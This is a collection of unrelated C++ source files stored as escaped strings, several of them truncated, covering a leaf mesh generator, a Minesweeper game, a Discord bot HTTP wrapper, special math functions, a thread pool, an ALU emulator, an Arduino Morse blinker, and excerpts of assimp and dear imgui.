nullptr) {\r\n    return std::string();\r\n  }\r\n  int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr);\r\n  std::string utf8_string;\r\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, utf8_string.data(),\r\n      target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include \"leaf_generation.h\"\n\nint main() {\n\n    Leaf_Param leaf_param;\n    leaf_param.m1 = 2;\n    leaf_param.m2 = 3;\n    leaf_param.max_width_posi = 0.65; // MWP\n    leaf_param.leaf_length = 1.0; // Unit: m\n    leaf_param.leaf_width = 0.08; // Unit: m\n    leaf_param.leaf_thickness = 0.0002;\n    leaf_param.curve_num = 10;\n\n    bool specific_curves = false;\n    if(specific_curves){\n        // Create a leaf mesh with specific blade undulations\n        leaf_param.argv_y = {13.95, -38.7, 40.5, -44.55, 22.95, -18.9, 30.6, -20.7, 37.8, -18.45}; // Unit: degree\n        leaf_param.argv_z = {7.2, -4.8, 20.7, -29.4, 28.5, -21, 3.6, -27, 5.4, -0.6, 16.5};\n    }else{\n        // Create a leaf mesh with random blade undulations with max angle restrictions\n        leaf_param.max_angle_y = 45; // Unit: degree\n        leaf_param.max_angle_z = 30;\n    }\n\n    // Leaf position coordinates in 3D space\n    leaf_param.px = 0, leaf_param.py = 0, leaf_param.pz = 0;\n    // Leaf rotation angles in 3D space\n    leaf_param.rx = 0, leaf_param.ry = 0, leaf_param.rz = 0;\n    // If single layer, the output is just a 3D surface mesh. Otherwise, the output is a manifold 3D object.\n    leaf_param.is_single_layer = false;\n\n    // Replace folder path with yours\n    std::string dest_folder = \"C:\\\\Users\\\\Xiang\\\\Desktop\\\\\";\n    Leaf leaf = gen_leaf_om(leaf_param, dest_folder);\n\n    float surface_area;\n\n    float area = CGAL::to_double(CGAL::Polygon_mesh_processing::area(leaf.get_mesh()));\n    if(leaf_param.is_single_layer){\n        surface_area = area * 10000; // Convert square meter to square centimeter\n\n    }else{\n        // We only count single side leaf surface area\n        surface_area = area * 5000;\n\n    }\n    std::cout << \"Surface Area: \" << surface_area << std::endl;\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <windows.h>\n#include <ctime>\n#include <chrono>\n#include <cstdlib>\n\n// Constants\n\n#define sizeOfName 100         ///< Maximum size for the filename.\n#define minCoordinate 8        ///< Minimum coordinate value for grid dimensions.\n#define twentyPercents 0.2     ///< Represents 20% of the grid size.\n#define error (-1)             ///< Error code for failure.\n#define valid 1                ///< Code indicating valid operation.\n#define zero 0                 ///< Constant for zero value.\n#define minPost 0              ///< Minimum index for array operations.\n#define mine 1                 ///< Constant indicating a mine.\n\n// Function prototypes\nvoid buildUserMat(char**& userMat, int rows, int cols);\nvoid console(int color);\nvoid printUserMat(char** userMat, int rows, int cols);\nvoid printMat(int** userMat, int rows, int cols);\nint takeDetails(char* fileName, int& rows, int& cols, int& mines);\nvoid buildGameMat(int**& gameMat, int rows, int cols);\nint random(int min , int max);\nvoid postMines(int**& gameMat,int row , int col , int size);\nvoid fixDetails(int& rows, int& cols, int& mines);\nint game(char**& userMat, int** gameMat,int rows , int cols , int mines);\nchar countOfMines (int** gameMat, int startR, int startC , int endR, int endC , int rows , int cols);\nchar date(char* fileName);\nvoid deleteGameMat(int** gameMat,int rows);\nvoid deleteUserMat(char** gameMat,int rows);\n\n/**\n * @brief Main function to execute the Minesweeper game.\n *\n * Initializes the game parameters, reads from a file, and manages the game loop.\n *\n * @return 0 on successful execution.\n */\n int main()\n{\n    srand((unsigned)time(NULL)); // Initialization of random\n    char fileName[sizeOfName];\n    std::cout << \"Please enter the name of the file\" << std::endl;\n    std::cin.getline(fileName, sizeOfName);\n    int rows, cols, mines;\n\n    // Load game details from file\n    if (takeDetails(fileName, rows, cols, mines) == error)\n        std::cout << \"Error, saving game details\" << std::endl;\n    else\n    {\n        std::cout << rows << cols << mines << std::endl;\n        fixDetails(rows, cols, mines);\n\n        // Initialize game matrices\n        int **gameMat = nullptr;\n        buildGameMat(gameMat, rows, cols);\n        printMat(gameMat, rows, cols);\n        postMines(gameMat, rows, cols, mines);\n        printMat(gameMat, rows, cols);\n\n        char **userMat = nullptr;\n        buildUserMat(userMat, rows, cols);\n        printUserMat(userMat, rows, cols);\n\n        // Start the game\n        if (game(userMat, gameMat, rows, cols, mines) == -1)\n            std::cout << \"Error, saving game details\" << std::endl;\n\n        // Cleanup\n        deleteUserMat(userMat, rows);\n        deleteGameMat(gameMat, rows);\n    }\n    return 0;\n}\n\n\n/**\n * @brief Builds the user matrix.\n *\n * Allocates memory for the user matrix and initializes it with spaces.\n *\n * @param userMat Reference to the user matrix pointer.\n * @param rows Number of rows in the matrix.\n * @param cols Number of columns in the matrix.\n */\nvoid buildUserMat(char**& userMat, int rows, int cols)\n{\n    // Dynamic allocation of the user matrix.\n    userMat = new char*[rows];\n    for (int i = 0; i < rows; ++i) {\n        userMat[i] = new char [cols];\n        for (int j = 0; j < cols; ++j)\n            userMat[i][j] = ' '; // Initialize each cell to space.\n    }\n}\n\n/**\n * @brief Prints the user matrix.\n *\n * Displays the current state of the user matrix to the console.\n *\n * @param userMat The user matrix to be printed.\n * @param rows Number of rows in the matrix.\n * @param cols Number of columns in the matrix.\n */\nvoid printUserMat(char** userMat, int rows, int cols)\n{\n    std::cout << \"  \"; // Print leading spaces for column indices.\n    for (int j = 0; j < cols; ++j)\n        std::cout << \"  \" << j << \" \"; // Print column indices.\n    std::cout << std::endl;\n\n    for (int i = 0; i < rows; ++i)\n    {\n        std::cout << \"  \"; // Print leading spaces for row separator.\n        for (int j = 0; j < cols; ++j)\n            std::cout << \" ---\"; // Print horizontal separator.\n        std::cout << std::endl << i << \" |\"; // Print row index.\n\n        for (int k = 0; k < cols; ++k)\n        {\n            // Use console color based on the value in the user matrix.\n            if (userMat[i][k] == 48) // Check for '0'\n            {\n                console(2); // Set color for '0'.\n                std::cout << \" \" << userMat[i][k]; // Print '0'.\n                console(7); // Reset color.\n            }\n            else if (userMat[i][k] > 48 && userMat[i][k] < 52) // Check for '1' or '2'.\n            {\n                console(1); // Set color for '1' or '2'.\n                std::cout << \" \" << userMat[i][k]; // Print the value.\n                console(7); // Reset color.\n\n            }\n            else if (userMat[i][k] > 51 && userMat[i][k] < 55) // Check for '3' or '4'.\n            {\n                console(4|2); // Set color for '3' or '4'.\n                std::cout <<",
    "#include \"F100cBot.hpp\"\n#include <cstdlib>\n#include <curl/curl.h>\n#include <curl/easy.h>\n#include <fstream>\n#include <iostream>\n#include <jansson.h>\n#include <sstream>\n#include <string>\nnamespace Diplomacy {\nstatic size_t callback_function(char* ptr, size_t, size_t nmemb, void* userdata) {\n  std::string& out = *reinterpret_cast<std::string*>(userdata);\n  out.append(ptr, nmemb);\n  return nmemb;\n}\nDiscord_API::Discord_API() {\n  if (!curl) exit(-1);\n  headers = curl_slist_append(headers, \"Content-Type: application/json\");\n  headers = curl_slist_append(headers, \"Accept: application/json\");\n  headers = curl_slist_append(headers, \"Authorization: Bot \" DISCORD_TOKEN);\n  headers = curl_slist_append(headers, \"User-Agent: DiscordBot (https://github.com/F100cTomas/discord-diplomacy, 1.0)\");\n}\nDiscord_API::~Discord_API() {\n  curl_slist_free_all(headers);\n  curl_easy_cleanup(curl);\n}\njson_t* Discord_API::get_request(const char* url) {\n  std::string discord_url = DISCORD_API_URL;\n  discord_url.append(url);\n  curl_easy_setopt(curl, CURLOPT_URL, discord_url.c_str());\n  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n  std::string jsonString{};\n  curl_easy_setopt(curl, CURLOPT_WRITEDATA, reinterpret_cast<void*>(&jsonString));\n  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback_function);\n  if (curl_easy_perform(curl) != CURLE_OK) exit(-1);\n  json_error_t error;\n  json_t*      out = json_loads(jsonString.c_str(), static_cast<size_t>(0), &error);\n  if (out == nullptr) exit(-1);\n  return out;\n}\nvoid Discord_API::post_request(const char* url) {\n  std::string discord_url = DISCORD_API_URL;\n  discord_url.append(url);\n  curl_easy_setopt(curl, CURLOPT_URL, discord_url.c_str());\n  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n  curl_easy_setopt(curl, CURLOPT_POST, 1L);\n  std::ifstream     file{\"./build/data.json\"};\n  std::stringstream ss{};\n  ss << file.rdbuf();\n  std::string json{ss.str()};\n  std::cout << '\\n' << json << \"<- JSON\";\n  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json.c_str());\n  curl_easy_perform(curl);\n  std::cout << '\\n' << discord_url << '\\n';\n}\n} // namespace Diplomacy\n",
    "#include \"whit.h\"\n\ndouble const whit::pi = acos(-1.);\ndouble const whit::EulerGamma = 0.57721566490153;\n//***********************************************************************\n  /**\n   *Constructor\n   \\param n0 is the largest order that can be called\n   */\n\nwhit::whit(int n0=40)\n{\n  //make sure n0 is even\n  if (n0%2 != 0)\n    {\n      n0 += 1;\n      cout << \" n set to \" << n0 << endl;\n    }\n  n = n0;\n  m = n/2;\n  //allocate 2d array\n  try{\n     pd = new double * [n+2];\n     for (int i=0;i<n+2;i++)\n       {\n         pd[i] = new double [m+2];\n       }\n     array = new double[n+2];\n     }\n\n  catch (bad_alloc &memoryAllocationException)\n    {\n      cout << \"could not allocate whit memory \"\n\t   << memoryAllocationException.what() << endl;\n    \n    }\n}\n//***********************************************************************\n  /**\n   *Destructor\n   */\nwhit::~whit()\n{\n  for (int i=0;i<n+2;i++)\n    {\n      delete [] pd[i];\n    }\n  delete [] pd;\n  delete [] array;\n}\n\n\n//***********************************************************************\n  /**\n   * returns the wave function for a pure coulomb potential\n   * \\param nu = sommerfeld parameter =Z*Zp*e2*Kwave/energyCM/2.\n   * \\param l = angular momentum value\n   * \\param x = Kwave*r where Kwave is the imaginary asymptotic wave number \n   * and r is the radius\n   */\ndouble whit::getWaveFunction(double nu, int l, double rho)\n{\n  //old way\n  //double out = AsymptoticExpansion(-nu,l,2.*rho);\n  //derivative *= 2.;\n  //return out;\n\n  return whittakerW(nu, l , rho);\n\n}\n\n//************************************************************************\n  /**\n   *          Computation of the Pochammer symbols          \n   */\n\ndouble  whit::Pochammer (double a, int n)\n{\n  if (n == 0) return 1.;\n  double out = 1.;\n  for(int i=0;i < n; i++)\n    {\n      out *= a + (double)i;\n    }\n  return out;  \n}\n//************************************************************************\n  /**\n   *     Computation of the Kummer function truncated at N terms    \n   */\ndouble whit::KummerN (int N, double a, double b, double z, double & Derivative)\n{\n  Derivative = 0.;\n  if (N == 0) return 1.;\n  double output = 1.;\n  \n  for (int i=1;i<=N;i++)\n    {\n      double r1 = Pochammer(a,i);\n      double r2 = Pochammer(b,i);\n      double r3 = Pochammer(1,i);\n      output += r1/r2/r3*pow(z,i);\n      Derivative += r1/r2/r3*(double)i*pow(z,i-1);\n  }  \n  return output;\n}\n\n//****************************************************************************\n/**          Computation of the Kummer function\n */\ndouble whit::Kummer (double a, double b, double z, double &Derivative)\n{\n  Derivative = 0.;\n  double output = 1.;\n  for (int i=1;i<=25;i++)\n    {\n      double r1 = Pochammer(a,i);\n      double r2 = Pochammer(b,i);\n      double r3 = Pochammer(1,i);\n      output += r1/r2/r3*pow(z,i);\n      Derivative += r1/r2/r3*(double)i*pow(z,i-1);\n  }  \n  return output;\n}\n//***********************************************************************\n  /**     \n   * Computation of 0F1 function\n   */\ndouble whit::oF1(double b, double z)\n{\n  double output = 1.;\n  double scale = z/b;\n  output += scale;\n  int n=1;\n  for (;;)\n    {\n     n++;\n     scale *= z/(b+(double)(n-1))/((double)n);\n     output += scale;\n     if (abs(scale) < 1e-14) break;\n    }\n  return output;\n}\n//****************************************************************************\n/**\n *    COMPUTATION OF THE PSI DIGAMMA FUNCTION\n *  calculate for large x using 6.3.18, then use recurrence relation 6.3.6\n * to get our value (Abramowitz and stegan)\n *\n \\param x is the independent variable\n */\ndouble whit::psi (double x)\n{\n\n  double const Zstart=25;\n  double  z = Zstart; // value of x to calculate 6.3.18\n  int p = 0;\n  if (x < z)\n    {\n       p = (int) (z-x);\n       z = (double)p + x; // want xx and x separated by an interger value\n    }\n  else z = x;\n\n  //calculate phi using 6.3.18 for z\n  double  phiLarge = log(z) - 1./2./z - 1./12./z/z + 1./120./pow(z,4) \n           - 1./252./pow(z,6);\n\n  double dif = 0.; //difference between wanted phi and phiLarge\n  if (x < Zstart) for (int i=1;i<=p;i++) dif += 1./((double)i-1.+x);\n\n  //cout << \" psi \" << x << \" \" << phiLarge - dif << endl;\n  return phiLarge - dif;\n}\n//****************************************************************************\n/**\n * Computation of the Euler Gamma function (Striling like expansion)\n \\param z is the independent variable\n */\ndouble  whit::gamma (double z)\n{\n  if (z == 0) return 1;\n  double x = 1.;\n  \n  while (z<21.)\n    {\n      x = x * z;\n      z++;\n    }\n\n double som =  1/12./z - 1./360./pow(z,3) + 1./42./30./pow(z,5)\n   - 1./30./56./pow(z,7) + 5./66./90./pow(z,9) - 691/12./11./2730./pow(z,11)\n   + 7./6./13./14./pow(z,13) - 3617./510./15./16./pow(z,15)\n   + 43867./798./17./18./pow(z,17) - 174611./330./19./20./pow(z,19)\n   + 854513./138./21./22./pow(z,21);\n\n double y = (z - .5) * log(z) - z + .5 * log(2 * 3.14159265359) + som;\n return  exp(y) / x;\n}\n//******************************************************************",
    "#include \"ThreadPool.h\"\r\n\r\n/**\r\n * Constructs a thread pool with the specified number of threads.\r\n * @param threads The number of worker threads in the pool.\r\n */\r\nThreadPool::ThreadPool(size_t threads)\r\n        : stop(false) { // Initializes the 'stop' flag to false\r\n    for (size_t i = 0; i < threads; ++i) {\r\n        // Each worker thread executes this lambda function\r\n        workers.emplace_back(\r\n                [this] {\r\n                    while (true) { // Worker threads run indefinitely until 'stop' is set to true\r\n                        std::function<void()> task;\r\n                        {\r\n                            std::unique_lock<std::mutex> lock(this->queue_mutex);\r\n                            // Wait until there is a task in the queue or the pool is stopped\r\n                            this->condition.wait(lock,\r\n                                                 [this] { return this->stop || !this->tasks.empty(); });\r\n                            // If stop is true and tasks are empty, exit the thread\r\n                            if (this->stop && this->tasks.empty())\r\n                                return;\r\n                            // Retrieve the next task from the queue\r\n                            task = std::move(this->tasks.front());\r\n                            this->tasks.pop();\r\n                        }\r\n                        // Execute the task\r\n                        task();\r\n                    }\r\n                }\r\n        );\r\n    }\r\n}\r\n\r\n/**\r\n * Destructor for the ThreadPool class. Stops all worker threads before exiting.\r\n */\r\nThreadPool::~ThreadPool() {\r\n    {\r\n        std::unique_lock<std::mutex> lock(queue_mutex);\r\n        // Set 'stop' flag to true to signal all threads to stop\r\n        stop = true;\r\n    }\r\n    // Notify all waiting threads\r\n    condition.notify_all();\r\n    // Join all threads to ensure they complete execution\r\n    for (std::thread &worker: workers)\r\n        worker.join();\r\n}\r\n\r\n/**\r\n * Enqueues a task to be executed by the thread pool.\r\n * @param task The task (function) to be executed.\r\n */\r\nvoid ThreadPool::enqueue(std::function<void()> task) {\r\n    {\r\n        std::unique_lock<std::mutex> lock(queue_mutex);\r\n        // Check if adding tasks is allowed (thread pool has not been stopped)\r\n        if (stop)\r\n            throw std::runtime_error(\"enqueue on stopped ThreadPool\");\r\n        // Add the task to the queue\r\n        tasks.emplace(task);\r\n    }\r\n    // Notify one waiting thread that a new task is available\r\n    condition.notify_one();\r\n}\r\n\r\n\r\n",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2024, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms,\nwith or without modification, are permitted provided that the following\nconditions are met:\n\n* Redistributions of source code must retain the above\n  copyright notice, this list of conditions and the\n  following disclaimer.\n\n* Redistributions in binary form must reproduce the above\n  copyright notice, this list of conditions and the\n  following disclaimer in the documentation and/or other\n  materials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\n  contributors may be used to endorse or promote products\n  derived from this software without specific prior\n  written permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n\n/** @file  TriangulateProcess.cpp\n *  @brief Implementation of the post processing step to split up\n *    all faces with more than three indices into triangles.\n *\n *\n *  The triangulation algorithm will handle concave or convex polygons.\n *  Self-intersecting or non-planar polygons are not rejected, but\n *  they're probably not triangulated correctly.\n *\n * DEBUG SWITCHES - do not enable any of them in release builds:\n *\n * AI_BUILD_TRIANGULATE_COLOR_FACE_WINDING\n *   - generates vertex colors to represent the face winding order.\n *     the first vertex of a polygon becomes red, the last blue.\n * AI_BUILD_TRIANGULATE_DEBUG_POLYS\n *   - dump all polygons and their triangulation sequences to\n *     a file\n */\n#ifndef ASSIMP_BUILD_NO_TRIANGULATE_PROCESS\n\n#include \"PostProcessing/TriangulateProcess.h\"\n#include \"PostProcessing/ProcessHelper.h\"\n#include \"Common/PolyTools.h\"\n\n#include <memory>\n#include <cstdint>\n\n//#define AI_BUILD_TRIANGULATE_COLOR_FACE_WINDING\n//#define AI_BUILD_TRIANGULATE_DEBUG_POLYS\n\n#define POLY_GRID_Y 40\n#define POLY_GRID_X 70\n#define POLY_GRID_XPAD 20\n#define POLY_OUTPUT_FILE \"assimp_polygons_debug.txt\"\n\nusing namespace Assimp;\n\nnamespace {\n\n    /**\n     * @brief Helper struct used to simplify NGON encoding functions.\n     */\n    struct NGONEncoder {\n        NGONEncoder() : mLastNGONFirstIndex((unsigned int)-1) {}\n\n        /**\n         * @brief Encode the current triangle, and make sure it is recognized as a triangle.\n         *\n         * This method will rotate indices in tri if needed in order to avoid tri to be considered\n         * part of the previous ngon. This method is to be used whenever you want to emit a real triangle,\n         * and make sure it is seen as a triangle.\n         *\n         * @param tri Triangle to encode.\n         */\n        void ngonEncodeTriangle(aiFace * tri) {\n            ai_assert(tri->mNumIndices == 3);\n\n            // Rotate indices in new triangle to avoid ngon encoding false ngons\n            // Otherwise, the new triangle would be considered part of the previous NGON.\n            if (isConsideredSameAsLastNgon(tri)) {\n                std::swap(tri->mIndices[0], tri->mIndices[2]);\n                std::swap(tri->mIndices[1], tri->mIndices[2]);\n            }\n\n            mLastNGONFirstIndex = tri->mIndices[0];\n        }\n\n        /**\n         * @brief Encode a quad (2 triangles) in ngon encoding, and make sure they are seen as a single ngon.\n         *\n         * @param tri1 First quad triangle\n         * @param tri2 Second quad triangle\n         *\n         * @pre Triangles must be properly fanned from the most appropriate vertex.\n         */\n        void ngonEncodeQuad(aiFace *tri1, aiFace *tri2) {\n            ai_assert(tri1->mNumIndices == 3);\n            ai_assert(tri2->mNumIndices == 3);\n            ai_assert(tri1->mIndices[0] == tri2->mIndices[0]);\n\n            // If the selected fanning vertex is the same as the previously\n            // emitted ngon, we use the opposite vertex which also happens to work\n            // for tri-fanning a concave quad.\n            // ref: https://github.com/assimp/assimp/pull/3695#issuecomment-805999760\n            if (isConsideredSameAsLastNgon(tri1",
    "#include \"alu.h\"\n\nALU::ALU(std::vector<uint16_t> &mem, int pcInit) : memory(mem), pc(pcInit)\n{\n    functions.resize(15);\n    functions[0] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return am(op1, op2, op3); };\n    functions[1] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return sm(op1, op2, op3); };\n    functions[2] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return mm(op1, op2, op3); };\n    functions[3] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return dm(op1, op2, op3); };\n    functions[4] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return bnem(op1, op2, op3); };\n    functions[5] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return sltm(op1, op2, op3); };\n    functions[6] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return ai(op1, op2, op3); };\n    functions[7] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return si(op1, op2, op3); };\n    functions[8] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return mi(op1, op2, op3); };\n    functions[9] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return di(op1, op2, op3); };\n    functions[10] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return lci(op1, op2, op3); };\n    functions[11] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return sci(op1, op2, op3); };\n    functions[12] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return lo(op1, op2, op3); };\n    functions[13] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return so(op1, op2, op3); };\n    functions[14] = [this](uint8_t op1, uint8_t op2, uint8_t op3)\n    { return jb(op1, op2, op3); };\n}\n\n// Add the function implementations for each ALU operation, printing, and executing here...\nint ALU::am(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = memory[op1] + memory[op2];\n    return 1;\n}\n\n// subtract memory-memory\n// opcode 0001\nint ALU::sm(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = memory[op1] - memory[op2];\n    return 1;\n}\n\n// multiply memory-memory\n// opcode 0010\nint ALU::mm(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = memory[op1] * memory[op2];\n    return 1;\n}\n\n// divide memory-memory\n// opcode 0011\nint ALU::dm(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    if (memory[op2] == 0)\n    {\n        std::string op = \"dm \" + std::to_string(op1) + \" \" + std::to_string(op2) + \" \" + std::to_string(op3);\n        throw std::invalid_argument(\"Error: Division by zero.\\nOPCODE: \" + op);\n    }\n    memory[op3] = memory[op1] / memory[op2];\n    return 1;\n}\n\n// branch if not equal memory-memory\n// opcode 0100\nint ALU::bnem(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    if (memory[op1] != memory[op2])\n    {\n        return int(op3); // Adjust program counter\n    }\n    else\n    {\n        return 1;\n    }\n}\n\n// set less than memory-memory\n// opcode 0101\nint ALU::sltm(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = (memory[op1] < memory[op2]) ? 1 : 0;\n    return 1;\n}\n\n// add immediate\n// opcode 0110\nint ALU::ai(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = memory[op1] + op2;\n    return 1;\n}\n\n// subtract immediate\n// opcode 0111\nint ALU::si(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = memory[op1] - op2;\n    return 1;\n}\n\n// multiply immediate\n// opcode 1000\nint ALU::mi(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = memory[op1] * op2;\n    return 1;\n}\n\n// divide immediate\n// opcode 1001\nint ALU::di(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    if (op2 == 0)\n    {\n        std::string op = \"di \" + std::to_string(op1) + \" \" + std::to_string(op2) + \" \" + std::to_string(op3);\n        throw std::invalid_argument(\"Error: Division by zero.\\nOPCODE: \" + op);\n    }\n    memory[op3] = memory[op1] / op2;\n    return 1;\n}\n\n// load constant immediate\n// opcode 1010\nint ALU::lci(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = op1 + op2;\n    return 1;\n}\n\n// subtract constant immediate\n// opcode 1011\nint ALU::sci(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    // is this right?\n    memory[op3] = op1 - op2;\n    return 1;\n}\n\n// load using offset\n// opcode 1100\nint ALU::lo(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[op3] = memory[memory[op1] + memory[op2]];\n    return 1;\n}\n\n// store using offset\n// opcode 1101\nint ALU::so(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    memory[memory[op1] + memory[op2]] = memory[op3];\n    return 1;\n}\n\n// jump back\n// opcode 1110\nint ALU::jb(uint8_t op1, uint8_t op2, uint8_t op3)\n{\n    return -(int(op1 + op2 + op3));\n}\n\n// Functions related to PC\nvoid ALU::setPC(int newPC)\n{\n    pc = newPC;\n}\n\nint ALU::getPC()\n{\n    return pc;\n}\n\nvoid ALU::printPC()\n{\n    std::cout << \"CURRENT PC: \" << pc << std::endl;\n}\n\nvoid ALU::printInstruction(uint16_t instruction)\n{\n    uint8_t opcode = (instruction >> 12) & 0x0F; // Extract bits [15:12]\n    uint8_t op1 = (instruction >> 8) & 0x0F;     // Extract bits [11:8]\n    uint8_t op2 = (instruction >> 4) & 0x0F;     // Extract bits [7:4]\n    uint8_t op3 = instruction & 0x0F;\n\n    std::c",
    "#include <Arduino.h>\n\n#define LED_PIN 12\n#define KRATCE '.'\n#define DLOUZE '-'\n\n#define TRV_KRATCE 200 // Del\u0161\u00ed trv\u00e1n\u00ed pro lep\u0161\u00ed viditelnost\n#define TRV_DLOUZE 600\n#define PAUZA 200 // Pauza mezi symboly v jednom p\u00edsmenu\n#define PAUZA_DELSI 600 // Pauza mezi p\u00edsmeny\n#define PAUZA_SLOVO 1000 // Pauza mezi slovy\n\nconst char *morseovka[] = {\n    \".-\", \"-...\", \"-.-.\", \"-..\", \".\", \"..-.\", \"--.\", \"....\", \"..\", \".---\",\n    \"-.-\", \".-..\", \"--\", \"-.\", \"---\", \".--.\", \"--.-\", \".-.\", \"...\", \"-\",\n    \"..-\", \"...-\", \".--\", \"-..-\", \"-.--\", \"--..\"};\n\nbool text_vypsan = false;\n\nvoid setup()\n{\n  pinMode(LED_PIN, OUTPUT);\n  Serial.begin(9600);\n}\n\nvoid led_blikni(int pin, int trvani)\n{\n  digitalWrite(pin, HIGH);\n  delay(trvani);\n  digitalWrite(pin, LOW);\n}\n\nvoid morseovka_blikni(const char *vstupni_text)\n{\n  while (*vstupni_text)\n  {\n    if (*vstupni_text == KRATCE)\n    {\n      led_blikni(LED_PIN, TRV_KRATCE);\n    }\n    else if (*vstupni_text == DLOUZE)\n    {\n      led_blikni(LED_PIN, TRV_DLOUZE);\n    }\n    vstupni_text++;\n    delay(PAUZA);\n  }\n}\n\nvoid loop()\n{\n  if (!text_vypsan)\n  {\n    Serial.print(\"Zadejte text (a-z): \");\n    text_vypsan = true;\n  }\n\n  if (Serial.available())\n  {\n    String vstupni_text = Serial.readString();\n    \n    for (int i = 0; i < (int)vstupni_text.length(); i++)\n    {\n      char znak = toupper(vstupni_text[i]);\n\n      if (znak >= 'A' && znak <= 'Z')\n      {\n        int index = znak - 'A';\n        morseovka_blikni(morseovka[index]);\n        delay(PAUZA_DELSI);\n      }\n      else if (znak == ' ') // Detekce mezery pro slovo\n      {\n        delay(PAUZA_SLOVO);\n      }\n    }\n    \n    text_vypsan = false;\n    Serial.println();\n  }\n}\n",
    "// dear imgui, v1.91.3\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: Typing-Select support\n// [SECTION] Widgets: Box-Select support\n// [SECTION] Widgets: Multi-Select support\n// [SECTION] Widgets: Multi-Select helpers\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include 